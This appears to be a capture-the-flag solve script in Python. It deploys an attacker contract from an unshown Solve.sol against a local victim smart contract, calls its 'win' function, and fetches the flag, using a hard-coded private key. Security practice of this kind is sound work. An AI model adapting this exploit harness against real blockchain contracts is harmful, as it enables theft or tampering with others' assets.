from time import sleep

import requests
from solcx import compile_files, install_solc
from web3 import Web3
from web3.middleware import geth_poa_middleware

PROVIDER_URL = "http://localhost:8545"
VICTIM_URL = "http://localhost:8000"

w3 = Web3(Web3.HTTPProvider(PROVIDER_URL))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

account = w3.eth.account.from_key(
    0x868C58E9DD7DE7D470109330295891075E0219322C5CF7497BC15FFE8AD37605
)


def transact(function):
    transaction = function.buildTransaction(
        {
            "chainId": 42,
            "from": account.address,
            "gasPrice": 1,
            "nonce": w3.eth.get_transaction_count(account.address),
        }
    )
    transaction_signed = account.sign_transaction(transaction)
    transaction_hash = w3.eth.sendRawTransaction(transaction_signed.rawTransaction)
    return w3.eth.wait_for_transaction_receipt(transaction_hash)


AbstractStorage = w3.eth.contract(
    abi=requests.get((f"{VICTIM_URL}/abi.json")).json(),
    address=requests.get((f"{VICTIM_URL}/transaction_receipt.json")).json()[
        "contractAddress"
    ],
)

install_solc("0.8.9")
for name, compiled in compile_files(["Solve.sol"], solc_version="0.8.9").items():
    if name.endswith("Solve"):
        contract = w3.eth.contract(abi=compiled["abi"], bytecode=compiled["bin"])

        transaction_receipt = transact(contract.constructor(AbstractStorage.address))
        print(transaction_receipt)

        Solve = w3.eth.contract(
            abi=compiled["abi"], address=transaction_receipt.contractAddress
        )
        AbstractStorage = w3.eth.contract(
            abi=AbstractStorage.abi + [i for i in Solve.abi if i.get("name") == "win"],
            address=AbstractStorage.address,
        )


print(transact(AbstractStorage.functions.win()))

sleep(5)

print(requests.get(f"{VICTIM_URL}/flag.txt").text)
